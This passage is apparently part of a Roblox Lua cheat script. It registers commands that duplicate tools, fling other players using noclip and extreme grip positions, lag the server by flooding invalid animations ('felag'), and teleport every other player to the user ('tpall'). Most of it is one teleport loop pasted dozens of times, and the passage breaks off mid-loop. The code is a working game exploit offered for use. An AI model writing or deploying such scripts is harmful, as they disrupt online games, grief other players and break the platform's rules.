    workspace.CurrentCamera.CameraSubject = tempchar:FindFirstChild("Humanoid")
    for _, tool in pairs(LocalPlayer.Backpack:GetChildren()) do
    if tool:IsA("Tool") then
            tool.Parent = LocalPlayer
        end
    end
    LocalPlayer.Character:ClearAllChildren()
    local char = Instance.new("Model", workspace)
    table.insert(characters, char)
    Instance.new("Humanoid", char)
    LocalPlayer.Character = char
    repeat runservice.RenderStepped:Wait() until LocalPlayer.Character ~= nil
end)
repeat runservice.RenderStepped:Wait() until #LocalPlayer:GetChildren() - 4 - currentamount >= toolamount
renderstepped:Disconnect()
repeat runservice.RenderStepped:Wait() until LocalPlayer.Character:FindFirstChild("HumanoidRootPart") ~= nil
for _, char in pairs(characters) do
    char:Destroy()
end
for index, tool in pairs(LocalPlayer:GetChildren()) do
    if tool:IsA("Tool") then
        tool.Parent = LocalPlayer.Backpack
        tool.Handle.Massless = true
        tool.Grip = CFrame.new(Vector3.new(0, ballsize, 0)) * CFrame.Angles(math.deg(index), index, 0)
        tool.Parent = LocalPlayer.Character
        if tool.Handle:FindFirstChild("Mesh") ~= nil then
            tool.Handle.Mesh:Destroy()
        end
    end
end
LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = savepos
tempchar:Destroy()
LocalPlayer.Character:FindFirstChild("Humanoid").HipHeight = ballsize
end)

addcmd('tinybowl',{'tbowl'},
function()
local toolamount = 10 -- How much covered the bowl is
local bowlsize = 5 -- How big the bowl is



local LocalPlayer = game:GetService("Players").LocalPlayer
local runservice = game:GetService("RunService")
local characters = {}
LocalPlayer.Character:FindFirstChild("Humanoid"):UnequipTools()
local currentamount = #LocalPlayer.Backpack:GetChildren()
LocalPlayer.Character.Archivable = true
local tempchar = LocalPlayer.Character:Clone()
tempchar.Parent = workspace
local savepos = LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame
local renderstepped = runservice.RenderStepped:Connect(function()
workspace.CurrentCamera.CameraSubject = tempchar:FindFirstChild("Humanoid")
for _, tool in pairs(LocalPlayer.Backpack:GetChildren()) do
if tool:IsA("Tool") then
tool.Parent = LocalPlayer
end
end
LocalPlayer.Character:ClearAllChildren()
local char = Instance.new("Model", workspace)
table.insert(characters, char)
Instance.new("Humanoid", char)
LocalPlayer.Character = char
repeat runservice.RenderStepped:Wait() until LocalPlayer.Character ~= nil
end)
repeat runservice.RenderStepped:Wait() until #LocalPlayer:GetChildren() - 4 - currentamount >= toolamount
renderstepped:Disconnect()
repeat runservice.RenderStepped:Wait() until LocalPlayer.Character:FindFirstChild("HumanoidRootPart") ~= nil
for _, char in pairs(characters) do
char:Destroy()
end
for index, tool in pairs(LocalPlayer:GetChildren()) do
if tool:IsA("Tool") then
tool.Parent = LocalPlayer.Backpack
tool.Handle.Massless = true
tool.Grip = CFrame.new(Vector3.new(math.sin(index * 0.1), bowlsize, 0)) * CFrame.Angles(math.sin(index * 0.1), index, 0)
tool.Parent = LocalPlayer.Character
if tool.Handle:FindFirstChild("Mesh") ~= nil then
tool.Handle.Mesh:Destroy()
end
end
end
LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = savepos
tempchar:Destroy()
LocalPlayer.Character:FindFirstChild("Humanoid").HipHeight = bowlsize
end)


addcmd('toolfling', {},
function(args,speaker)
-- Press Q or E to move up or down. Q is down, E is up.
-- Press R or T to change WalkSpeed. R is slower, T is faster.

game.Players.LocalPlayer.Character.Animate.toolnone.ToolNoneAnim.AnimationId = "nil"
wait()
game.Players.LocalPlayer.Character.Humanoid.JumpPower = 0
noclip = true
game:GetService('RunService').Stepped:connect(function()
if noclip then
game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
end
end)
wait()
game.Players.LocalPlayer.Character.HumanoidRootPart.CustomPhysicalProperties = PhysicalProperties.new(math.huge,math.huge,math.huge,math.huge,math.huge)
wait()
for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
   if (v:IsA("Tool")) then
v.GripPos = Vector3.new(math.huge,math.huge,math.huge)
end
end
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
plr = game.Players.LocalPlayer
mouse = plr:GetMouse()
mouse.KeyDown:connect(function(key)
if key == "q" then
   game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(0,-5,0)
end
end)
plr = game.Players.LocalPlayer
mouse = plr:GetMouse()
mouse.KeyDown:connect(function(key)
if key == "e" then
   game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(0,5,0)
end
end)
plr = game.Players.LocalPlayer
mouse = plr:GetMouse()
mouse.KeyDown:connect(function(key)
if key == "r" then
   game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = game.Players.LocalPlayer.Character.Humanoid.WalkSpeed - 5
end
end)
plr = game.Players.LocalPlayer
mouse = plr:GetMouse()
mouse.KeyDown:connect(function(key)
if key == "t" then
   game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = game.Players.LocalPlayer.Character.Humanoid.WalkSpeed + 5
end
end)
repeat
noclip = true
wait()
until game.Players.LocalPlayer.Character.Humanoid.Health == 0
wait()
noclip = false
plr = game.Players.LocalPlayer
mouse = plr:GetMouse()
mouse.KeyDown:connect(function(key)
if key == "q" then
   game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(0,5,0)
end
end)
plr = game.Players.LocalPlayer
mouse = plr:GetMouse()
mouse.KeyDown:connect(function(key)
if key == "e" then
   game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(0,-5,0)
end
end)
plr = game.Players.LocalPlayer
mouse = plr:GetMouse()
mouse.KeyDown:connect(function(key)
if key == "r" then
   game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = game.Players.LocalPlayer.Character.Humanoid.WalkSpeed + 5
end
end)
plr = game.Players.LocalPlayer
mouse = plr:GetMouse()
mouse.KeyDown:connect(function(key)
if key == "t" then
   game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = game.Players.LocalPlayer.Character.Humanoid.WalkSpeed - 5
end
end)
end)


addcmd('felag', {'lag'},
function(args,speaker)
_G.lag = true
local text = "katie was here\n"
while game:service("RunService").RenderStepped:Wait() do
	if _G.lag == true then
		for i = 1,math.random(3,6) do
			local LocalPlayer = game:GetService("Players").LocalPlayer
			local anim = Instance.new("Animation")
			anim.AnimationId = text .. math.random()
			LocalPlayer.Character.Humanoid:LoadAnimation(anim):Play()
			anim:Destroy()
		end
	end
end
end)

addcmd('tpall', {'bringall'},
function(args,speaker)
local LocalPlayer = game:GetService("Players").LocalPlayer
local runservice = game:GetService("RunService")
local characters = {}
LocalPlayer.Character:FindFirstChild("Humanoid"):UnequipTools()
local currentamount = #LocalPlayer.Backpack:GetChildren()
LocalPlayer.Character.Archivable = true
local tempchar = LocalPlayer.Character:Clone()
tempchar.Parent = workspace
local savepos = LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame
local renderstepped = runservice.RenderStepped:Connect(function()
    workspace.CurrentCamera.CameraSubject = tempchar:FindFirstChild("Humanoid")
    for _, tool in pairs(LocalPlayer.Backpack:GetChildren()) do
    if tool:IsA("Tool") then
            tool.Parent = LocalPlayer
        end
    end
    LocalPlayer.Character:ClearAllChildren()
    local char = Instance.new("Model", workspace)
    table.insert(characters, char)
    Instance.new("Humanoid", char)
    LocalPlayer.Character = char
    repeat runservice.RenderStepped:Wait() until LocalPlayer.Character ~= nil
end)
repeat runservice.RenderStepped:Wait() until #LocalPlayer:GetChildren() - 2 - currentamount >= #game.Players:GetPlayers() * 6
renderstepped:Disconnect()
repeat runservice.RenderStepped:Wait() until LocalPlayer.Character:FindFirstChild("HumanoidRootPart") ~= nil
for _, char in pairs(characters) do
    char:Destroy()
end
for _, tool in pairs(LocalPlayer:GetChildren()) do
    if tool:IsA("Tool") then
        tool.Parent = LocalPlayer.Backpack
    end
end
LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = savepos
tempchar:Destroy()

wait()

for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(.1)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
